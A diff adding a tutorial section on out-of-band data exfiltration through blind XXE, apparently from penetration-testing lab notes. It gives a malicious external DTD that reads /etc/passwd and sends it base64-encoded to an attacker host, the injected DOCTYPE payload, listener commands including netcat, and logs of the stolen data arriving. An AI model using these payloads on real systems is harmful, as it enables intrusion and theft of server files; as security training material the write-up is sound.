@@ -24,6 +24,7 @@ This document covers common techniques for identifying and exploiting **web vuln
         - [Local File Disclosure (LFI)](#local-file-disclosure-lfi)
         - [Advanced File Disclosure - CDATA](#advanced-file-disclosure---cdata)
         - [Advanced File Disclosure - Error Based](#advanced-file-disclosure---error-based)
+        - [Out.of-band Data Exfiltration](#out-of-band-data-exfiltration)
 
 ---
 
@@ -1078,5 +1079,99 @@ The application returns an error message containing the contents of the target f
 ![Filtered output](images/xxe-error3.png)
 
 This confirms successful **error-based file disclosure via XXE**, even though no application output was directly reflected.
+
+---
+
+### Out-of-band Data Exfiltration
+
+In the previous section (**Advanced File Disclosure – Error-Based**), we exploited a **blind XXE vulnerability** by leveraging verbose runtime error messages. In this scenario, we encounter a **fully blind XXE vulnerability**, where **no output is returned**—neither reflected entity values nor parser errors.
+
+To exfiltrate data under these conditions, we use **Out-of-Band (OOB) data exfiltration**. This technique forces the application to send the extracted data to an **external system controlled by the attacker**, rather than returning it in the HTTP response.
+
+OOB techniques are not unique to XXE and are commonly used in **SQL injection**, **command injection**, and **XSS** attacks.
+
+**Step 1: Create Malicious External DTD**
+
+We begin by defining two parameter entities inside an external DTD file (`xxe.dtd`).
+
+The first entity reads a local file from the back-end server and **base64-encodes its contents** using a PHP filter wrapper to prevent XML parsing issues:
+
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+```
+
+The second entity sends the encoded file contents to our server via an HTTP `GET` request:
+
+```xml
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://IP:8001/?content=%file;'>">
+```
+
+Both entities are saved within the same `xxe.dtd` file.
+
+**Step 2: Start a Listener**
+
+Next, we start a listener on our attacking machine to capture outbound requests from the target server. Any of the following methods can be used:
+
+```bash
+sudo python3 -m http.server 8001
+```
+
+or
+
+```bash
+sudo php -S 0.0.0.0:8001
+```
+
+or
+
+```bash
+sudo nc -lvnp 8001
+```
+
+**Step 3: Reference the External DTD**
+
+We inject the following payload directly after the XML declaration to load and process the external DTD:
+
+```xml
+<!DOCTYPE email [ 
+<!ENTITY % remote SYSTEM "http://IP:8001/xxe.dtd">
+%remote;
+%oob;
+]>
+```
+
+Finally, we reference the `content` entity within the vulnerable XML element:
+
+```xml
+<email>
+  &content;
+</email>
+```
+
+![Filtered output](images/oob.PNG)
+
+Although no output is returned in the application response, the XML parser processes the external entities during parsing.
+
+**Step 4: Retrieve Exfiltrated Data**
+
+On our listener, we observe inbound requests from the target server:
+
+```
+Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
+10.129.234.170 - - [04/Jan/2026 07:00:24] "GET /xxe.dtd HTTP/1.0" 200 -
+10.129.234.170 - - [04/Jan/2026 07:00:24] "GET /?content=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5O ...
+```
+
+![Filtered output](images/oob2.PNG)
+
+The `content` parameter contains the base64-encoded contents of the target file. We decode it locally:
+
+```bash
+echo "<base64 string>" | base64 -d
+```
+
+![Filtered output](images/oob3.PNG)
+
+This confirms successful **out-of-band data exfiltration via XXE**, even in a fully blind exploitation scenario.
 
 ---
